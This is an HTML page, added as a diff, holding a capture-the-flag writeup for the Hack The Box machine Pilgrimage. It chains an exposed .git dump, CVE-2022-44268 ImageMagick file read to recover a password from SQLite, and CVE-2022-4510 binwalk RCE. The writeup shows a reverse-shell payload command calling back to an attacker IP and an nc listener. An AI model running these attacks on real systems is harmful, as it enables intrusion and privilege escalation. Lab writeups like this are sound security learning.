@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pilgrimage &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge htb">HTB</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Pilgrimage</h1>
+    <div class="meta">Target: <code>10.10.14.126</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">git</span><span class="tag">CVE</span><span class="tag">ImageMagick</span><span class="tag">SQLite</span><span class="tag">binwalk</span><span class="tag">SSH</span><span class="tag">infodisclosure</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#cve-2022-44268-imagemagick-arbitrary-file-read">CVE-2022-44268, ImageMagick Arbitrary File Read</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#cve-2022-4510-binwalk-rce">CVE-2022-4510, binwalk RCE</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Pilgrimage is an easy Linux box with a satisfying two-CVE chain, both in tools you'd never suspect. An exposed <code>.git</code> directory leaks the source and a bundled <strong>ImageMagick 7.1.0-49</strong> binary vulnerable to <strong>CVE-2022-44268</strong> (arbitrary file read). I use it to read a SQLite database and recover a user's password. Root comes from <strong>CVE-2022-4510</strong>, a path-traversal RCE in <strong>binwalk 2.3.2</strong>, which a root cron job runs against every uploaded image.</p>
+<h2 id="recon">Recon</h2>
+<p>A directory scan exposed a <code>.git</code> folder. I dumped it and read the history:</p>
+<pre><code class="language-sh">python3 git_dumper.py http://pilgrimage.htb/ ~/pilgrim/
+</code></pre>
+<p>The repo revealed the app bundles a static <code>magick</code> binary and the <code>bulletproof</code> PHP upload library. The binary's version is the lead:</p>
+<pre><code>ImageMagick 7.1.0-49 beta
+</code></pre>
+<h2 id="foothold">Foothold</h2>
+<h3 id="cve-2022-44268-imagemagick-arbitrary-file-read">CVE-2022-44268, ImageMagick Arbitrary File Read</h3>
+<blockquote>
+<p><strong>How it works:</strong> when ImageMagick processes a PNG with a <code>profile</code> chunk naming a local file path, it <em>embeds the contents of that file</em> into the output image's metadata. The app shrinks uploaded images with this exact version, so I upload a crafted PNG referencing a file, download the processed result, and read the file's bytes back out of the metadata.</p>
+</blockquote>
+<p>The site stores data in SQLite (seen in the source: <code>sqlite:/var/db/pilgrimage</code>). I pointed the read at that database. It's binary, so instead of the script's text decode I extracted the embedded profile and reversed it from hex:</p>
+<pre><code class="language-sh">identify -verbose &lt;processed&gt;.png | grep -Pv &quot;^( |Image)&quot; | xxd -r -p
+... CREATE TABLE users ... emily ‹redacted› ...
+</code></pre>
+<p>That gave <code>emily</code>'s password, which worked over SSH.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="cve-2022-4510-binwalk-rce">CVE-2022-4510, binwalk RCE</h3>
+<p><code>pspy</code>/process listing showed root running <code>malwarescan.sh</code>, which uses <code>inotifywait</code> to watch the upload directory and runs <strong>binwalk</strong> on every new file:</p>
+<pre><code class="language-sh">binout=&quot;$(/usr/local/bin/binwalk -e &quot;$filename&quot;)&quot;   # binwalk v2.3.2, as root
+</code></pre>
+<blockquote>
+<p><strong>The bug:</strong> binwalk extracts embedded filesystems using <code>os.path.join</code> to build output paths. A PFS-format entry can contain <code>../</code> in its filename, and because <code>os.path.join</code> doesn't resolve <code>../</code>, binwalk's "stay inside the output dir" check never trips. That's arbitrary file write as the binwalk process, and binwalk supports plugins that auto-execute during a scan, turning the write into RCE as root.</p>
+</blockquote>
+<p>I built a reverse-shell PNG payload and dropped it into the watched directory:</p>
+<pre><code class="language-sh">python3 walkingpath.py reverse Untitled.png 10.10.14.126 53
+# place it in /var/www/pilgrimage.htb/shrunk/ (wget on-box)
+</code></pre>
+<p>The instant the root cron picked it up, binwalk executed the embedded plugin:</p>
+<pre><code class="language-sh">rlwrap nc -lvnp 53
+# whoami
+root
+</code></pre>
+<h2 id="root">Root</h2>
+<p>Box rooted.</p>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Exposed <code>.git</code> = source + bundled binaries.</strong> Dumping it revealed both the SQLite path and the vulnerable ImageMagick version.</li>
+<li><strong>CVE-2022-44268 turns image processing into file read</strong>, extract the profile chunk and reverse it from hex.</li>
+<li><strong>CVE-2022-4510 makes binwalk RCE</strong> via unresolved <code>../</code> in extracted filenames; dangerous because monitoring scripts run it as root on attacker-supplied files.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
